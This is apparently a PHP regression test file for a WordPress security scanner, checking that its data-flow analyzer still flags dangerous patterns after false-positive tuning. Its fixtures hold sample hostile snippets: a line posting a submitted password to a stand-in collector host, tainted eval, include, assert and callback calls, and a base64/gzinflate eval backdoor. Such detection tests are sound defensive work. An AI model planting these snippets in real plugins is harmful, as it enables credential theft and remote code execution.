<?php
/**
 * Security-preservation regression tests for false-positive hardening.
 *
 * These cases pair the benign patterns we intentionally suppress with the
 * dangerous equivalents that must remain reportable. The goal is to prevent
 * future false-positive tuning from silently weakening proven detection paths.
 */

define( 'WP_CLI', true );

class WP_CLI {
	public static function add_command( $name, $class ) {}
}

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';
require dirname( __DIR__ ) . '/src/SecurityScanCommand.php';

$failed = 0;

$semantic_cases = [
	[
		'name' => 'request-controlled callback remains critical',
		'code' => <<<'CODE'
<?php
$callback = $_GET['callback'];
call_user_func( $callback, $_POST['payload'] );
CODE,
		'expect' => 'dataflow_tainted_callback_sink',
	],
	[
		'name' => 'tainted include remains critical even after local existence check',
		'code' => <<<'CODE'
<?php
$file = __DIR__ . '/pages/' . $_GET['page'] . '.php';
if ( is_file( $file ) ) {
	require $file;
}
CODE,
		'expect' => 'dataflow_include_taint',
	],
	[
		'name' => 'external credential transfer remains reportable',
		'code' => <<<'CODE'
<?php
$url = 'https://collector.example.invalid/submit';
wp_remote_post( $url, [ 'body' => [ 'password' => $_POST['password'] ] ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'request-controlled remote read reaching eval remains critical',
		'code' => <<<'CODE'
<?php
$payload = file_get_contents( $_GET['url'] );
eval( $payload );
CODE,
		'expect' => 'dataflow_eval_taint',
	],
	[
		'name' => 'tainted collection remains tainted after array_filter',
		'code' => <<<'CODE'
<?php
$callbacks = array_filter( $_REQUEST['callbacks'] );
call_user_func( $callbacks[0], $_POST['payload'] );
CODE,
		'expect' => 'dataflow_tainted_callback_sink',
	],
	[
		'name' => 'direct tainted assert remains critical',
		'code' => <<<'CODE'
<?php
assert( $_POST['expression'] );
CODE,
		'expect' => 'dataflow_code_taint',
	],
];

foreach ( $semantic_cases as $case ) {
	$analyzer = new Security_Scan_Php_Data_Flow_Analyzer();
	$findings = $analyzer->analyze( $case['code'] );
	$rules = array_column( $findings, 'rule' );
	$ok = in_array( $case['expect'], $rules, true );

	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $case['name'] . PHP_EOL;
	if ( ! $ok ) {
		$failed++;
		foreach ( $findings as $finding ) {
			echo '      ' . ( $finding['rule'] ?? 'unknown' ) . ' — ' . ( $finding['description'] ?? '' ) . PHP_EOL;
		}
	}
}

$command = new Security_Scan_Command();
$density = new ReflectionMethod( $command, 'scan_php_density_heuristics' );
$density->setAccessible( true );
$findings_property = new ReflectionProperty( $command, 'findings' );
$findings_property->setAccessible( true );
$findings_property->setValue( $command, [] );
$seen = [];
$dense_code = <<<'CODE'
<?php
$payload = $_POST['payload'];
$decoded = base64_decode( $payload );
$inflated = gzinflate( $decoded );
eval( $inflated );
CODE;
$density->invokeArgs( $command, [ 'Plugins', 'plugins/example/backdoor.php', $dense_code, &$seen, 1 ] );
$density_rules = array_column( $findings_property->getValue( $command ), 'rule' );
$density_ok = in_array( 'dense_suspicious_php', $density_rules, true );
echo ( $density_ok ? 'PASS  ' : 'FAIL  ' ) . 'compact execution/obfuscation/request cluster remains detected' . PHP_EOL;
if ( ! $density_ok ) {
	$failed++;
}

if ( $failed > 0 ) {
	exit( 1 );
}

echo PHP_EOL . 'False-positive hardening security-boundary tests passed.' . PHP_EOL;
